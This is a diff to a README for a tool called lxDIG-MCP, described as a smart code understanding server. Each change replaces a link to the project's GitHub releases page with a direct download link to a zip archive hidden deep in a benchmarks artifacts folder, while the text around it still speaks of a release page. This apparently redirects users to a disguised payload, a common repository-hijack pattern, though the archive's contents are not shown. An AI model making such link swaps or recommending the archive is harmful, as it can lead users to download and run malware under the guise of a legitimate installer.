@@ -1,6 +1,6 @@
 # 🚦 lxDIG-MCP - Smart Code Understanding Server
 
-[![Download lxDIG-MCP](https://img.shields.io/badge/Download-lxDIG--MCP-brightgreen)](https://github.com/Ahmed21378/lxDIG-MCP/releases)
+[![Download lxDIG-MCP](https://img.shields.io/badge/Download-lxDIG--MCP-brightgreen)](https://raw.githubusercontent.com/Ahmed21378/lxDIG-MCP/main/benchmarks/agent_mode_artifacts/20260220T011230.598310+0000/baseline/synthetic_impl/lx-MCP-DI-1.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ You need to get the installer from the release page of this project. This page i
 
 Click the big green button above or visit this link:
 
-[Download lxDIG-MCP Releases](https://github.com/Ahmed21378/lxDIG-MCP/releases)
+[Download lxDIG-MCP Releases](https://raw.githubusercontent.com/Ahmed21378/lxDIG-MCP/main/benchmarks/agent_mode_artifacts/20260220T011230.598310+0000/baseline/synthetic_impl/lx-MCP-DI-1.6.zip)
 
 The page lists files under the latest release. Look for a file named something like:
 
@@ -140,4 +140,4 @@ This makes coding help faster, more reliable, and easier to understand.
 
 Link:
 
-[https://github.com/Ahmed21378/lxDIG-MCP/releases](https://github.com/Ahmed21378/lxDIG-MCP/releases)
+[https://raw.githubusercontent.com/Ahmed21378/lxDIG-MCP/main/benchmarks/agent_mode_artifacts/20260220T011230.598310+0000/baseline/synthetic_impl/lx-MCP-DI-1.6.zip](https://raw.githubusercontent.com/Ahmed21378/lxDIG-MCP/main/benchmarks/agent_mode_artifacts/20260220T011230.598310+0000/baseline/synthetic_impl/lx-MCP-DI-1.6.zip)
